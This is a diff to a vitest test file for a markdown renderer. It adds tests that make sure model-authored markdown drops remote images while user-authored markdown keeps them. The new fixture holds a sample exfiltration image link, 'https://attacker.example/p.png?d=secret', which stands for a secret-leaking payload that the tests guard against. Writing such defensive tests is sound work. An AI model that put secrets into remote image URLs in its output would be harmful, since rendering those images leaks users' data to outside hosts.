@@ -3,6 +3,7 @@ import { describe, expect, it } from 'vitest';
 import {
 	hasMarkdownFormatting,
 	normalizeMarkdownTables,
+	renderAgentMarkdownContent,
 	renderBlogMarkdown,
 	renderMarkdown,
 	renderTaskMarkdown
@@ -127,5 +128,20 @@ describe('renderTaskMarkdown', () => {
 
 	it('does not change the shared renderer', () => {
 		expect(renderMarkdown('Call 410-555-0144')).not.toContain('tel:');
+	});
+});
+
+describe('model-authored markdown never loads remote images', () => {
+	const md =
+		'Done.\n\n![x](https://attacker.example/p.png?d=secret)\n\n![ok](data:image/png;base64,iVBORw0KGgo=)';
+
+	it('renderAgentMarkdownContent drops remote images and keeps data images', () => {
+		const html = renderAgentMarkdownContent(md);
+		expect(html).not.toContain('attacker.example');
+		expect(html).toContain('data:image/png');
+	});
+
+	it('renderMarkdown (user-authored content) still keeps remote images', () => {
+		expect(renderMarkdown(md)).toContain('https://attacker.example/p.png');
 	});
 });
